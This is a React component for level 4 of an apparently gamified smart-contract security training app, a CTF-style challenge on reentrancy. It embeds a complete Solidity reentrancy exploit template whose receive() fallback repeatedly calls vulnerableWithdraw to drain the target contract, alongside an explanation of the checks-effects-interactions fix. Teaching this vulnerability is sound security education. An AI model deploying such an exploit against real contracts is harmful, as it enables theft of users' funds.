// src/components/levels/Level4ReentrancyLabyrinth.jsx
import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { useWeb3 } from '../../contexts/Web3Context';
import LevelCompletion from './LevelCompletion';

const Level4ReentrancyLabyrinth = () => {
  const { account, contracts, provider } = useWeb3();
  
  const [contractBalance, setContractBalance] = useState('0');
  const [playerBalance, setPlayerBalance] = useState('0');
  const [depositAmount, setDepositAmount] = useState('');
  const [exploitCode, setExploitCode] = useState('');
  const [exploitAddress, setExploitAddress] = useState('');
  const [exploitSuccessful, setExploitSuccessful] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [error, setError] = useState('');
  const [showCompletion, setShowCompletion] = useState(false);
  const [gasUsed, setGasUsed] = useState(0);
  
  // Fetch contract and player balances
  const fetchBalances = async () => {
    if (!contracts.levels || !contracts.levels[4] || !account) return;
    
    try {
      // Get contract balance
      const balance = await provider.getBalance(contracts.levels[4].address);
      setContractBalance(ethers.utils.formatEther(balance));
      
      // Get player balance in the contract
      const playerBal = await contracts.levels[4].balances(account);
      setPlayerBalance(ethers.utils.formatEther(playerBal));
      
      // Check if exploit was successful
      const exploitStatus = await contracts.levels[4].exploitSuccessful();
      setExploitSuccessful(exploitStatus);
      
      // Update current step based on exploit status
      if (exploitStatus && currentStep < 3) {
        setCurrentStep(3);
      }
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  };
  
  useEffect(() => {
    fetchBalances();
    // Refresh balances every 5 seconds
    const interval = setInterval(fetchBalances, 5000);
    return () => clearInterval(interval);
  }, [contracts.levels, account, provider]);
  
  // Deposit ETH to the contract
  const depositEth = async () => {
    if (!depositAmount || isNaN(parseFloat(depositAmount)) || parseFloat(depositAmount) <= 0) {
      setError('Please enter a valid deposit amount');
      return;
    }
    
    setIsLoading(true);
    setError('');
    
    try {
      const amount = ethers.utils.parseEther(depositAmount);
      
      // Call deposit function with ETH
      const tx = await contracts.levels[4].deposit({ value: amount });
      await tx.wait();
      
      // Update balances
      await fetchBalances();
      setDepositAmount('');
      
      // Move to step 2 if not already there
      if (currentStep === 1) {
        setCurrentStep(2);
      }
    } catch (error) {
      console.error('Error depositing ETH:', error);
      setError('Failed to deposit ETH to the contract');
    } finally {
      setIsLoading(false);
    }
  };
  
  // Vulnerable withdraw
  const vulnerableWithdraw = async () => {
    if (!withdrawAmount || isNaN(parseFloat(withdrawAmount)) || parseFloat(withdrawAmount) <= 0) {
      setError('Please enter a valid withdrawal amount');
      return;
    }
    
    if (parseFloat(withdrawAmount) > parseFloat(playerBalance)) {
      setError('Withdrawal amount exceeds your balance');
      return;
    }
    
    setIsLoading(true);
    setError('');
    
    try {
      const amount = ethers.utils.parseEther(withdrawAmount);
      
      // Call vulnerable withdraw function
      const tx = await contracts.levels[4].vulnerableWithdraw(amount);
      await tx.wait();
      
      // Update balances
      await fetchBalances();
      setWithdrawAmount('');
    } catch (error) {
      console.error('Error withdrawing ETH:', error);
      setError('Failed to withdraw ETH from the contract');
    } finally {
      setIsLoading(false);
    }
  };
  
  // Secure withdraw
  const secureWithdraw = async () => {
    if (!withdrawAmount || isNaN(parseFloat(withdrawAmount)) || parseFloat(withdrawAmount) <= 0) {
      setError('Please enter a valid withdrawal amount');
      return;
    }
    
    if (parseFloat(withdrawAmount) > parseFloat(playerBalance)) {
      setError('Withdrawal amount exceeds your balance');
      return;
    }
    
    setIsLoading(true);
    setError('');
    
    try {
      const amount = ethers.utils.parseEther(withdrawAmount);
      
      // Call secure withdraw function
      const tx = await contracts.levels[4].secureWithdraw(amount);
      await tx.wait();
      
      // Update balances
      await fetchBalances();
      setWithdrawAmount('');
    } catch (error) {
      console.error('Error withdrawing ETH securely:', error);
      setError('Failed to withdraw ETH from the contract');
    } finally {
      setIsLoading(false);
    }
  };
  
  // Submit exploit contract address
  const submitExploit = async () => {
    if (!ethers.utils.isAddress(exploitAddress)) {
      setError('Please enter a valid contract address');
      return;
    }
    
    setIsLoading(true);
    setError('');
    
    try {
      // Call checkExploit function
      const tx = await contracts.levels[4].checkExploit(exploitAddress);
      await tx.wait();
      
      // Check if exploit was successful
      const success = await contracts.levels[4].exploitSuccessful();
      
      if (success) {
        setExploitSuccessful(true);
        setCurrentStep(3);
      } else {
        setError('Exploit verification failed. Make sure your exploit contract works correctly.');
      }
    } catch (error) {
      console.error('Error submitting exploit:', error);
      setError('Failed to verify exploit contract. Make sure it implements the required exploit logic.');
    } finally {
      setIsLoading(false);
    }
  };
  
  // Validate the solution
  const validateSolution = async () => {
    setIsLoading(true);
    setError('');
    
    try {
      // First make a deposit to test secure withdraw
      const depositTx = await contracts.levels[4].deposit({ value: ethers.utils.parseEther('0.01') });
      await depositTx.wait();
      
      // Call validateSolution function
      const tx = await contracts.levels[4].validateSolution();
      const receipt = await tx.wait();
      
      // Get gas used
      setGasUsed(receipt.gasUsed.toNumber());
      
      // Show completion modal
      setShowCompletion(true);
    } catch (error) {
      console.error('Error validating solution:', error);
      setError('Failed to validate solution. Make sure your secure withdraw implementation is correct.');
    } finally {
      setIsLoading(false);
    }
  };
  
  // Sample exploit contract code
  const exploitContractTemplate = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ReentrancyExploit {
    address payable public owner;
    address public target;
    uint256 public attackAmount;

    constructor(address _target) {
        owner = payable(msg.sender);
        target = _target;
    }

    // Function to start the exploit
    function exploit() external payable {
        require(msg.value > 0, "Need ETH to start attack");
        attackAmount = msg.value;
        
        // 1. Deposit funds first
        (bool success, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");
        
        // 2. Call vulnerable withdraw to start the reentrancy attack
        (success, ) = target.call(
            abi.encodeWithSignature("vulnerableWithdraw(uint256)", msg.value)
        );
        require(success, "Attack failed");
        
        // 3. Send all exploited funds back to owner
        owner.transfer(address(this).balance);
    }
    
    // Fallback function to execute the reentrancy
    receive() external payable {
        // Only execute if we still have ETH in the target contract
        if (target.balance >= attackAmount) {
            // Call withdraw again to drain more funds
            (bool success, ) = target.call(
                abi.encodeWithSignature("vulnerableWithdraw(uint256)", attackAmount)
            );
        }
    }
}`;
  
  // Set initial exploit code
  useEffect(() => {
    setExploitCode(exploitContractTemplate);
  }, []);
  
  return (
    <div className="level-container">
      <div className="level-header">
        <h2>Level 4: Reentrancy Labyrinth</h2>
        <p className="level-description">
          Identify and exploit the reentrancy vulnerability, then secure the contract against it.
        </p>
      </div>
      
      <div className="level-content">
        <div className="level-instructions">
          <h3>Instructions</h3>
          <ol>
            <li>Deposit ETH into the vulnerable contract</li>
            <li>Create and deploy an exploit contract to drain funds via reentrancy</li>
            <li>Fix the vulnerability by implementing the checks-effects-interactions pattern</li>
            <li>Validate your solution</li>
          </ol>
          
          <div className="info-box">
            <h4>What is a Reentrancy Vulnerability?</h4>
            <p>
              Reentrancy is a smart contract vulnerability where an attacker contract can repeatedly call 
              back into the vulnerable contract before the first invocation completes. This can allow the 
              attacker to withdraw more funds than they should be able to.
            </p>
            <p>
              The vulnerability occurs when a contract sends ETH before updating the internal state.
              The fix involves following the checks-effects-interactions pattern: perform all state 
              changes before making external calls.
            </p>
          </div>
          
          <div className="contract-balances">
            <h4>Contract State:</h4>
            <div className="balance-info">
              <span className="balance-label">Contract Balance:</span>
              <span className="balance-value">{contractBalance} ETH</span>
            </div>
            <div className="balance-info">
              <span className="balance-label">Your Balance:</span>
              <span className="balance-value">{playerBalance} ETH</span>
            </div>
            <div className="exploit-status">
              <span className="status-label">Exploit Status:</span>
              <span className={`status-value ${exploitSuccessful ? 'success' : 'pending'}`}>
                {exploitSuccessful ? 'Successful' : 'Not Completed'}
              </span>
            </div>
          </div>
        </div>
        
        <div className="level-interaction">
          {/* Step 1: Deposit ETH */}
          <div className={`level-step ${currentStep >= 1 ? 'active' : ''}`}>
            <h4>Step 1: Deposit ETH</h4>
            <div className="input-group">
              <label htmlFor="depositAmount">Amount to Deposit (ETH):</label>
              <div className="input-with-button">
                <input
                  type="number"
                  id="depositAmount"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  placeholder="0.1"
                  min="0.01"
                  step="0.01"
                />
                <button 
                  className="action-button"
                  onClick={depositEth}
                  disabled={isLoading}
                >
                  Deposit
                </button>
              </div>
            </div>
          </div>
          
          {/* Step 2: Create and Deploy Exploit */}
          <div className={`level-step ${currentStep >= 2 ? 'active' : 'disabled'}`}>
            <h4>Step 2: Create and Deploy Exploit</h4>
            
            <div className="code-container">
              <h5>Exploit Contract Template:</h5>
              <pre className="code-display">{exploitCode}</pre>
              <p className="code-hint">
                Deploy this contract with the vulnerable contract's address as the constructor parameter.
                Then call the exploit() function with some ETH to start the attack.
              </p>
            </div>
            
            <div className="input-group">
              <label htmlFor="exploitAddress">Deployed Exploit Contract Address:</label>
              <div className="input-with-button">
                <input
                  type="text"
                  id="exploitAddress"
                  value={exploitAddress}
                  onChange={(e) => setExploitAddress(e.target.value)}
                  placeholder="0x..."
                />
                <button 
                  className="action-button"
                  onClick={submitExploit}
                  disabled={isLoading || exploitSuccessful}
                >
                  Verify Exploit
                </button>
              </div>
            </div>
          </div>
          
          {/* Step 3: Test Secure Withdraw Implementation */}
          <div className={`level-step ${currentStep >= 3 ? 'active' : 'disabled'}`}>
            <h4>Step 3: Test Secure Withdraw Implementation</h4>
            
            <div className="input-group">
              <label htmlFor="withdrawAmount">Amount to Withdraw (ETH):</label>
              <input
                type="number"
                id="withdrawAmount"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                placeholder="0.1"
                min="0.01"
                step="0.01"
              />
            </div>
            
            <div className="button-group">
              <button 
                className="action-button warning"
                onClick={vulnerableWithdraw}
                disabled={isLoading}
              >
                Vulnerable Withdraw
              </button>
              
              <button 
                className="action-button primary"
                onClick={secureWithdraw}
                disabled={isLoading}
              >
                Secure Withdraw
              </button>
            </div>
            
            <button
              className="action-button submit"
              onClick={validateSolution}
              disabled={isLoading || !exploitSuccessful}
            >
              Validate Solution
            </button>
          </div>
          
          {error && <div className="error-message">{error}</div>}
        </div>
      </div>
      
      {showCompletion && (
        <LevelCompletion
          level={4}
          pointsEarned={400}
          gasUsed={gasUsed}
          onClose={() => setShowCompletion(false)}
        />
      )}
    </div>
  );
};

export default Level4ReentrancyLabyrinth;